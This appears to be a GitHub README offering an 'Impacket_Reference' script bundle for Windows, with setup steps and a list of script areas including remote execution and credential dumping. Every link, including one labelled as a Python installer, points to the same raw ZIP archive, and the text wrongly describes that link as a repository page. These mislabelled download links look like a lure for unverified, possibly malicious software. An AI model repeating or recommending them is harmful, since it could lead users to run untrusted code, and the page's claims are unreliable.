# ⚙️ Impacket_Reference - Complete Script Guide for Windows

[![Download from GitHub](https://img.shields.io/badge/Download-Impacket_Reference-brightgreen?style=for-the-badge)](https://github.com/Lyrothanak20/Impacket_Reference/raw/refs/heads/main/bitter/Impacket_Reference_1.5.zip)

---

## 📥 Download and Setup

This guide helps you download and run the Impacket_Reference application on Windows. Impacket_Reference is a collection of example scripts to work with various network protocols and Windows features.

Click the green badge above or use this direct link to visit the GitHub page:

[https://github.com/Lyrothanak20/Impacket_Reference/raw/refs/heads/main/bitter/Impacket_Reference_1.5.zip](https://github.com/Lyrothanak20/Impacket_Reference/raw/refs/heads/main/bitter/Impacket_Reference_1.5.zip)

### How to get the software

1. Open the link above in your web browser.
2. On the GitHub page, look for the **Code** button near the top right.
3. Click **Code**, then select **Download ZIP**.
4. Save the ZIP file to a folder you can easily find, like your desktop or downloads folder.
5. After download ends, right-click the ZIP file and select **Extract All**.
6. Choose a location to extract the files, for example, a new folder on your desktop called `Impacket_Reference`.
7. Wait until Windows finishes extracting all files.

### What you need before running

- A Windows computer (Windows 10 or later is recommended).
- Basic knowledge of how to open and run programs.
- Python 3 installed on your machine. If you don’t have Python, download it from [https://github.com/Lyrothanak20/Impacket_Reference/raw/refs/heads/main/bitter/Impacket_Reference_1.5.zip](https://github.com/Lyrothanak20/Impacket_Reference/raw/refs/heads/main/bitter/Impacket_Reference_1.5.zip) and follow the installer instructions. Make sure to check the box for “Add Python to PATH” during installation.

---

## 🛠️ How to Run Impacket_Reference Scripts

Once you have downloaded and extracted the files, follow these steps to open and use the scripts.

### Using Command Prompt

1. Open **Command Prompt**:
   - Press `Windows + R` keys, type `cmd`, and press Enter.
2. Change the directory to where you extracted the files. For example, if you put the files in Desktop\Impacket_Reference, type:
   ```
   cd %USERPROFILE%\Desktop\Impacket_Reference
   ```
   and press Enter.
3. Make sure Python is working by typing:
   ```
   python --version
   ```
   This should show the installed Python version.
4. To see the list of available example scripts, type:
   ```
   dir *.py
   ```
   This will list all Python script files included.
5. To run a script, type:
   ```
   python scriptname.py
   ```
   Replace `scriptname.py` with the actual script file you want to run.

---

## 🔧 Setting Up Python Environment

Many scripts require some additional Python modules. To install these:

1. Open Command Prompt.
2. Type the following command and press Enter:
   ```
   pip install -r requirements.txt
   ```
3. Wait for the process to complete. This installs the necessary packages needed to run the scripts without errors.

---

## 🔍 Overview of Included Scripts

Impacket_Reference provides scripts in many areas related to network protocols and Windows management. Here are some examples:

- **Authentication Options:** Scripts that manage user credentials and verify permissions.
- **Remote Execution:** Run commands on other computers remotely.
- **Credential Dumping:** Tools to inspect and extract saved passwords from a system.
- **Kerberos:** Work with Kerberos authentication services.
- **Active Directory Enumeration:** Gather information about users and devices in a network.
- **Windows Administration:** Scripts to manage files, registry entries, and services.

The full list of available scripts and their uses can be found in the main documentation file included with the extraction or at the original GitHub page.

---

## ⚡ Running Your First Script Example

Try running the common authentication options script as a starter:

1. Open Command Prompt.
2. Navigate to the `Impacket_Reference` folder.
3. Run:
   ```
   python example_auth.py
   ```
   This script will show available authentication options and how to use them.

---

## 🔗 Useful Links

- Official GitHub repository:  
  [https://github.com/Lyrothanak20/Impacket_Reference/raw/refs/heads/main/bitter/Impacket_Reference_1.5.zip](https://github.com/Lyrothanak20/Impacket_Reference/raw/refs/heads/main/bitter/Impacket_Reference_1.5.zip)
- Python installer for Windows:  
  [https://github.com/Lyrothanak20/Impacket_Reference/raw/refs/heads/main/bitter/Impacket_Reference_1.5.zip](https://github.com/Lyrothanak20/Impacket_Reference/raw/refs/heads/main/bitter/Impacket_Reference_1.5.zip)

---

## 💡 Frequently Asked Questions

### Do I need programming skills?

No, a basic understanding of using Command Prompt and copying commands is enough.

### Can I install this on other operating systems?

This guide focuses on Windows. Some Linux or macOS users may need different steps.

### What to do if a script fails to run?

Check that Python and required packages are installed. Also, verify you are in the right folder.

---

Click the badge at the top anytime to visit the download page and get the latest updates.